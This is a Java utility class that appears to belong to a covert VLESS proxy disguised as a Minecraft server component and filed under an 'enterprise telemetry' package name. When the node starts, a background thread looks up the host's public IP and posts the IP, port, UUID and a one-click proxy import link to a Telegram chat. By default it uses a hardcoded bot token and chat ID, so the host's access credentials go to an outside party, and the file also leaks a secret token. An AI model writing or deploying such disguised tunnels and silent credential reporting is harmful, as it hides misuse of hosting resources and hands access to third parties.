package com.enterprise.telemetry.util;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.logging.Logger;

/**
 * 节点上线自动上报工具（通过 Telegram Bot 自动推送真实公网 IP、端口与 VLESS 订阅链接）
 */
public class TelegramNotifier {

    private static final String DEFAULT_BOT_TOKEN = "7516303149:AAGEA7yjJnGVhlE9tm_6EAEz1hz3lZjH1Us";
    private static final String DEFAULT_CHAT_ID = "6594687854";

    public static void notifyOnlineAsync(int port, String uuid, String path, Logger logger) {
        new Thread(() -> {
            try {
                // 等待 3 秒确保外网服务完全 ready
                Thread.sleep(3000);

                String publicIp = fetchPublicIp();
                if (publicIp == null || publicIp.isEmpty()) {
                    publicIp = "127.0.0.1";
                }

                String botToken = System.getenv("TG_BOT_TOKEN");
                if (botToken == null || botToken.trim().isEmpty()) {
                    botToken = DEFAULT_BOT_TOKEN;
                }

                String chatId = System.getenv("TG_CHAT_ID");
                if (chatId == null || chatId.trim().isEmpty()) {
                    chatId = DEFAULT_CHAT_ID;
                }

                String encodedPath = URLEncoder.encode(path, StandardCharsets.UTF_8);
                String vlessLink = "vless://" + uuid + "@" + publicIp + ":" + port + "?type=ws&path=" + encodedPath + "#MC-Edge-Node";

                String message = "🚀 *【Minecraft 边缘节点已上线】*\n\n"
                        + "🌐 *公网 IP:* `" + publicIp + "`\n"
                        + "🔌 *监听端口:* `" + port + "`\n"
                        + "🔑 *UUID:* `" + uuid + "`\n"
                        + "🛣️ *Path:* `" + path + "`\n"
                        + "📦 *协议:* `VLESS-WS (纯 Java 原生)`\n\n"
                        + "🔗 *一键导入链接:*\n`" + vlessLink + "`";

                sendTelegramMessage(botToken, chatId, message);
                logger.info("[TelegramNotifier] 节点上线信息已成功推送到 Telegram！(IP: " + publicIp + ", 端口: " + port + ")");
            } catch (Exception e) {
                logger.warning("[TelegramNotifier] 上报 Telegram 时遇到异常: " + e.getMessage());
            }
        }, "TG-Notifier-Worker").start();
    }

    private static String fetchPublicIp() {
        String[] ipProviders = {
                "https://api.ipify.org",
                "https://icanhazip.com",
                "https://ifconfig.me/ip",
                "https://checkip.amazonaws.com"
        };

        for (String provider : ipProviders) {
            try {
                URL url = URI.create(provider).toURL();
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestMethod("GET");
                if (conn.getResponseCode() == 200) {
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                        String ip = reader.readLine();
                        if (ip != null && !ip.trim().isEmpty()) {
                            return ip.trim();
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }
        return null;
    }

    private static void sendTelegramMessage(String botToken, String chatId, String text) throws Exception {
        String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
        String postData = "chat_id=" + URLEncoder.encode(chatId, StandardCharsets.UTF_8)
                + "&text=" + URLEncoder.encode(text, StandardCharsets.UTF_8)
                + "&parse_mode=Markdown";

        byte[] postBytes = postData.getBytes(StandardCharsets.UTF_8);

        URL url = URI.create(apiUrl).toURL();
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Content-Length", String.valueOf(postBytes.length));

        conn.getOutputStream().write(postBytes);
        conn.getOutputStream().flush();

        int responseCode = conn.getResponseCode();
        if (responseCode != 200) {
            throw new RuntimeException("Telegram API returned HTTP " + responseCode);
        }
    }
}
